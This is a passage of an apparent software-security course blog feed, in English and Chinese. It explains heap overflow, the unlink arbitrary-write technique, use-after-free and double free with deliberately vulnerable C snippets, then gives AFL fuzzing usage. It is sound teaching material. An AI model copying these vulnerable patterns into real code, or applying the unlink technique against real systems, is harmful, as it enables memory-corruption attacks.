class=&#34;number&#34;&gt;100&lt;/span&gt;];        &lt;span class=&#34;comment&#34;&gt;// 缓冲区&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*fun)(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *);  &lt;span class=&#34;comment&#34;&gt;// 函数指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;span class=&#34;type&#34;&gt;target_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结构体  &lt;code&gt;target&lt;/code&gt;  包含两个字段：&lt;br&gt;
 &lt;code&gt;buf&lt;/code&gt; ：一个大小为 100 字节的字符数组，是易受攻击的缓冲区。&lt;br&gt;
 &lt;code&gt;fun&lt;/code&gt; ：一个函数指针，指向接受一个字符指针参数的函数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缓冲区溢出&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gets(rec-&amp;gt;buf);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;gets()&lt;/code&gt;  是一个危险的函数，它从标准输入读取数据并存储到指定的缓冲区  &lt;code&gt;buf&lt;/code&gt;  中。&lt;br&gt;
 &lt;code&gt;gets()&lt;/code&gt;  不会检查输入数据的长度，如果输入超过了  &lt;code&gt;buf&lt;/code&gt;  的 100 字节大小限制，就会导致缓冲区溢出。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用堆溢出&lt;br&gt;
当攻击者提供的输入长度超过 100 字节时，超出的数据将会覆盖  &lt;code&gt;fun&lt;/code&gt;  函数指针。&lt;br&gt;
攻击者可以利用这种情况，将  &lt;code&gt;fun&lt;/code&gt;  指针重写为攻击者控制的地址，从而在程序中执行任意代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Difficult to Overwrite Non-Contiguous Memory&lt;br&gt;
Heap buffers are not adjacent, there may some extra space&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;It may be possible to calculate the extra space to craft an exploit&lt;/li&gt;
&lt;li&gt;But the exploit will be application-specific!
&lt;ol&gt;
&lt;li&gt;堆内存的分散性
&lt;ul&gt;
&lt;li&gt;堆上的缓冲区并不总是相邻的，因为它们根据内存分配器的策略进行分配。&lt;/li&gt;
&lt;li&gt;不同分配之间可能存在空隙（padding）或元数据（metadata），使得直接覆盖非连续内存变得困难。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存分配器的元数据
&lt;ul&gt;
&lt;li&gt;堆内存中分配的每个块通常带有元数据（如大小、状态、指向下一个块的指针等），用于管理内存块的分配和释放。&lt;/li&gt;
&lt;li&gt;攻击者在试图覆盖非连续内存时，还需要考虑这些元数据的存在，否则可能导致分配器崩溃或异常，暴露攻击的痕迹。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Heap Allocator&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Heap Allocator&#34;&gt;#&lt;/a&gt;Heap Allocator&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;How heap memory is allocated?&lt;br&gt;
Heap allocator maintains a &lt;strong&gt;doubly-linked list&lt;/strong&gt; of allocated and free chunks (blocks of memory)
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;malloc()&lt;/code&gt;  and  &lt;code&gt;free()&lt;/code&gt;  add or remove chunks from this list&lt;br&gt;
Chunk management information is stored together with user data in memory&lt;/li&gt;
&lt;li&gt;Writing data past the end of a chunk boundary may overwrite the management fields&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chunk Record&lt;br&gt;
Heap blocks are C records (i.e. struct) that have a few fields along with the chunk of memory
&lt;ul&gt;
&lt;li&gt;fd: the pointer to the next block&lt;/li&gt;
&lt;li&gt;bk: the pointer to the previous block&lt;/li&gt;
&lt;li&gt;ps: the size of the previous chunk&lt;/li&gt;
&lt;li&gt;sz: the size of the current chunk&lt;/li&gt;
&lt;li&gt;Other fields such as free flag to indicate if the current chunk is in the freelis&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlink a Chunk&lt;br&gt;
 &lt;code&gt;free()&lt;/code&gt;  removes a chunk from allocated list&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/28/671f8d584507c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Unlink performs the following two writes on the list’s fields:
&lt;ul&gt;
&lt;li&gt;chunk2‐&amp;gt;bk‐&amp;gt;fd = chunk2‐&amp;gt;fd&lt;/li&gt;
&lt;li&gt;chunk2‐&amp;gt;fd‐&amp;gt;bk = chunk2‐&amp;gt;bk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;By overflowing  &lt;code&gt;chunk2&lt;/code&gt; , attacker can take control of  &lt;code&gt;chunk2‐&amp;gt;fd&lt;/code&gt;  and  &lt;code&gt;chunk2‐&amp;gt;bk&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Suppose the attacker wants to write  &lt;code&gt;value&lt;/code&gt;  to memory address  &lt;code&gt;addr&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Attacker sets  &lt;code&gt;chunk2‐&amp;gt;fd&lt;/code&gt;  to be  &lt;code&gt;value&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Attacker sets  &lt;code&gt;chunk2‐&amp;gt;bk&lt;/code&gt;  to be  &lt;code&gt;(addr - offset_fd)&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;offset_fd&lt;/code&gt;  is the offset of the fd field in the record&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The attacker can write arbitrary value to arbitrary memory address in this way&lt;/li&gt;
&lt;li&gt;The first unlink write achieves the attacker’s goal:  &lt;code&gt;chunk2‐&amp;gt;bk‐&amp;gt;fd = chunk2‐&amp;gt;fd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The first write effectively becomes:  &lt;code&gt;(addr - offset_fb)‐&amp;gt;fd = value&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;This is the same as  &lt;code&gt;*addr = value&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Fields are selected by offsets&lt;/li&gt;
&lt;li&gt;&lt;code&gt;offset_fd&lt;/code&gt;  cancels out  &lt;code&gt;fd&lt;/code&gt; &lt;br&gt;
Attackers can use hundreds of writes to copy the shellcode into memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Prevention&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Prevention&#34;&gt;#&lt;/a&gt;Prevention&lt;/h2&gt;
&lt;p&gt;Very hard to detect and prevent due to the dynamic nature of the heap&lt;br&gt;
Possible ways to protect against heap overflow&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prevent execution of the payload by separating the code and data&lt;/li&gt;
&lt;li&gt;Introduce randomisation so the heap is not found at a fixed offset&lt;/li&gt;
&lt;li&gt;Introduce sanity checks into the heap allocator&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Pointer-related heap errors &#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Pointer-related heap errors &#34;&gt;#&lt;/a&gt;Pointer-related heap errors &lt;/h1&gt;
&lt;h2 id=&#34;Use After Free&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Use After Free&#34;&gt;#&lt;/a&gt;Use After Free&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;A memory is accessed after it is freed (and re-allocated)
&lt;ul&gt;
&lt;li&gt;Can cause a program to crash, use unexpected values, or execute code&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attackers may overwrite the re-allocated memory including metadata
&lt;ul&gt;
&lt;li&gt;May result in the same effect as some heap overflow vulnerabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Use After Free Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buf1, *buf2; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf1 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BUFSIZE1); &lt;span class=&#34;comment&#34;&gt;// 为 buf1 分配 BUFSIZE1 大小的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 释放 buf1，使其分配的内存可被重用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf1); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 可能在 buf1 释放的内存区域内分配 buf2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf2 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BUFSIZE2); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 攻击者可能会通过覆盖 buf2 及其元数据来利用漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(buf1, argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], BUFSIZE1&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example Problems
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;free(buf1)&lt;/code&gt;  的影响
&lt;ul&gt;
&lt;li&gt;当  &lt;code&gt;buf1&lt;/code&gt;  被释放后，其对应的内存区域变得可供再次分配。&lt;/li&gt;
&lt;li&gt;因为  &lt;code&gt;free()&lt;/code&gt;  并不会立即将内存清零或使指针失效，所以  &lt;code&gt;buf1&lt;/code&gt;  仍然指向被释放的内存区域。&lt;/li&gt;
&lt;li&gt;在这段代码中， &lt;code&gt;buf2&lt;/code&gt;  可能会被分配到  &lt;code&gt;buf1&lt;/code&gt;  释放的内存区域（这取决于堆分配器的实现和内存布局）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strncpy(buf1, argv[1], BUFSIZE1-1)&lt;/code&gt;  的问题
&lt;ul&gt;
&lt;li&gt;即使  &lt;code&gt;buf1&lt;/code&gt;  已被释放，程序仍然在此处试图使用  &lt;code&gt;buf1&lt;/code&gt;  进行写操作。&lt;/li&gt;
&lt;li&gt;由于  &lt;code&gt;buf1&lt;/code&gt;  被释放后可能被  &lt;code&gt;buf2&lt;/code&gt;  重新使用， &lt;code&gt;buf1&lt;/code&gt;  和  &lt;code&gt;buf2&lt;/code&gt;  可能指向相同的内存区域。这意味着通过  &lt;code&gt;strncpy()&lt;/code&gt;  对  &lt;code&gt;buf1&lt;/code&gt;  的写入可能会影响  &lt;code&gt;buf2&lt;/code&gt; ，甚至覆盖  &lt;code&gt;buf2&lt;/code&gt;  的元数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Double Free&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Double Free&#34;&gt;#&lt;/a&gt;Double Free&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;A memory address is freed (i.e.  &lt;code&gt;free()&lt;/code&gt; ) twice
&lt;ul&gt;
&lt;li&gt;Can also cause a program to crash, use unexpected values, or execute code&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attackers may corrupt metadata of new memory allocated at the address
&lt;ul&gt;
&lt;li&gt;May also result in the same effect as some heap overflow vulnerabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Double Free Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buf1, *buf2; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf1 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BUFSIZE1);  &lt;span class=&#34;comment&#34;&gt;// 为 buf1 分配 BUFSIZE1 大小的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf1);  &lt;span class=&#34;comment&#34;&gt;// 释放 buf1，内存可供重用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// buf2 可能被分配到 buf1 释放的内存区域&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf2 = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BUFSIZE2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// buf2 可能包含攻击者提供的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(buf2, argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], BUFSIZE2&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// buf1 被再次释放（双重释放）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf1); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 释放 buf2（使用了可能被攻击者修改的元数据）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example Problems
&lt;ol&gt;
&lt;li&gt;第一次释放  &lt;code&gt;buf1&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;通过  &lt;code&gt;free(buf1)&lt;/code&gt; ， &lt;code&gt;buf1&lt;/code&gt;  所占用的内存被释放，成为可供重用的内存区域。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buf2&lt;/code&gt;  可能分配到  &lt;code&gt;buf1&lt;/code&gt;  的内存区域&lt;/li&gt;
&lt;li&gt;因为  &lt;code&gt;buf1&lt;/code&gt;  已被释放，内存分配器可能会将  &lt;code&gt;buf2&lt;/code&gt;  分配到之前  &lt;code&gt;buf1&lt;/code&gt;  占用的内存区域。&lt;/li&gt;
&lt;li&gt;攻击者可能通过覆盖  &lt;code&gt;buf2&lt;/code&gt;  中的内容来修改元数据&lt;/li&gt;
&lt;li&gt;使用  &lt;code&gt;strncpy()&lt;/code&gt;  函数将用户输入复制到  &lt;code&gt;buf2&lt;/code&gt;  中，这可能导致覆盖  &lt;code&gt;buf2&lt;/code&gt;  的元数据（如堆链表指针或其他关键数据）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第二次释放  &lt;code&gt;buf1&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;free(buf1)&lt;/code&gt;  导致双重释放，因为  &lt;code&gt;buf1&lt;/code&gt;  已经在第一次释放后被重用，现在与  &lt;code&gt;buf2&lt;/code&gt;  指向相同的内存区域。&lt;/li&gt;
&lt;li&gt;此时，内存分配器可能会使用被攻击者修改的元数据，从而导致不安全的内存操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;释放  &lt;code&gt;buf2&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;当  &lt;code&gt;buf2&lt;/code&gt;  被释放时，内存分配器可能会再次处理被攻击者修改的元数据，进一步导致内存覆盖或异常。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Prevention and Detection of Pointer Errors&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Prevention and Detection of Pointer Errors&#34;&gt;#&lt;/a&gt;Prevention and Detection of Pointer Errors&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Difficult to detect all of them by either dynamic or static analysis&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Complex runtime states&lt;/li&gt;
&lt;li&gt;E.g. memory may be allocated, freed and used in different functions via aliases (pointers)&lt;/li&gt;
&lt;li&gt;Fuzzing may detect some in executed paths when they crash the program&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;The simplest prevention is to set all freed pointers to NULL&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Trigger null pointer dereference errors when accessed&lt;/li&gt;
&lt;li&gt;Most operating systems provide built-in defence against null-pointer dereference&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/AFL/</guid>
            <title>AFL</title>
            <link>http://example.com/course/AFL/</link>
            <category>C</category>
            <category>software security</category>
            <category>AFL</category>
            <category>Linux</category>
            <pubDate>Mon, 28 Oct 2024 14:45:49 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;American Fuzzy Lop&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#American Fuzzy Lop&#34;&gt;#&lt;/a&gt; American Fuzzy Lop&lt;/h1&gt;
&lt;h2 id=&#34;Definition&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Definition&#34;&gt;#&lt;/a&gt;Definition&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;A security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. Currently state-of-the-practice at fuzzing (together with forks)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A type of coverage-based fuzzing: Instrument target programs to track test coverage&lt;/li&gt;
&lt;li&gt;A type of evolutionary/genetic fuzzing: Attempt to generate inputs based on the response of the program&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Why AFL&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;The best general purpose fuzzer
&lt;ul&gt;
&lt;li&gt;For C/C++/Objective C programs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Effective and well-engineered with lots of heuristics
&lt;ul&gt;
&lt;li&gt;Fast – lots of test cases per second&lt;/li&gt;
&lt;li&gt;Clever – test cases are well chosen&lt;/li&gt;
&lt;li&gt;Easy to use (Linux and other platforms)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deliver out-of-the-box performance far superior to mutation fuzzing or coverage-only tools&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;AFL Approach
&lt;ol&gt;
&lt;li&gt;Load user-supplied initial test cases into the queue&lt;/li&gt;
&lt;li&gt;Take next input file from the queue&lt;/li&gt;
&lt;li&gt;Attempt to trim the test case to the smallest size&lt;/li&gt;
&lt;li&gt;Repeatedly mutate the file using traditional fuzzing strategies&lt;/li&gt;
&lt;li&gt;If any of the generated mutations resulted in a new state transition recorded by the instrumentation, add mutated output as a new entry in the queue&lt;/li&gt;
&lt;li&gt;Go to 2&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/28/671f221b5c7ee.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Fuzzing Through AFL&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Fuzzing Through AFL&#34;&gt;#&lt;/a&gt;Fuzzing Through AFL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Instrumenting Programs for AFL&lt;br&gt;
Compile through AFL wrappers to generate an instrumented executable for fuzzing
&lt;ul&gt;
&lt;li&gt;Basically, replace  &lt;code&gt;gcc&lt;/code&gt;  with  &lt;code&gt;afl‐gcc&lt;/code&gt;  or  &lt;code&gt;afl-clang&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For simple compilation,  &lt;code&gt;afl‐gcc test.c ‐o test&lt;/code&gt; &lt;br&gt;
For larger projects that use the make build system, add to the Makefile:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CC=path-to/afl-gcc&lt;/code&gt;  or  &lt;code&gt;CC=path-to/afl-clang&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;This allows to build instrumented target program with the AFL wrappers&lt;br&gt;
For C++ code, use the C++ wrappers  &lt;code&gt;afl-g++&lt;/code&gt;  or  &lt;code&gt;afl-clang++&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For example in the Makefile:  &lt;code&gt;CXX=path-to/afl-g++&lt;/code&gt;  or  &lt;code&gt;CXX=path-to/afl-clang++&lt;/code&gt; &lt;br&gt;
AFL 会在编译时插装目标程序的代码，以便在执行期间跟踪路径覆盖情况。插装后的二进制文件包含对 &lt;code&gt; __afl_maybe_log&lt;/code&gt;  的调用，该函数记录程序的执行状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fuzzing Through AFL&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Start fuzzing with AFL   &lt;code&gt;afl‐fuzz ‐i testcase ‐o output ./test @@&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Test cases are under testcase&lt;/li&gt;
&lt;li&gt;The output produced by  goes to the output directory&lt;/li&gt;
&lt;li&gt;The special symbols  &lt;code&gt;@@&lt;/code&gt;  tell AFL to take the file names under test case and feed it to test. Not needed if the program takes input from stdin&lt;/li&gt;
&lt;li&gt;Other common options:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-t&lt;/code&gt;  sets timeout for the executed process&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-m&lt;/code&gt;  sets memory limit for the executed process&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Initial Test Cases&lt;br&gt;
Don’t waste too much time trying to synthesise your target’s input format&lt;br&gt;
Find some real inputs that exercise as much of the target as possible&lt;br&gt;
From the AFL user guide:
&lt;ul&gt;
&lt;li&gt;Keep the files small. Under 1 kB is ideal, although not strictly necessary&lt;/li&gt;
&lt;li&gt;Use multiple test cases only if they are functionally different from each other&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When To Stop&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Never, as fuzzing is part of continuous integration&lt;/li&gt;
&lt;li&gt;hen the  &lt;code&gt;cycles counter&lt;/code&gt;  is green
&lt;ul&gt;
&lt;li&gt;Last new path was found many cycles ago&lt;/li&gt;
&lt;li&gt;Pending paths is zero&lt;/li&gt;
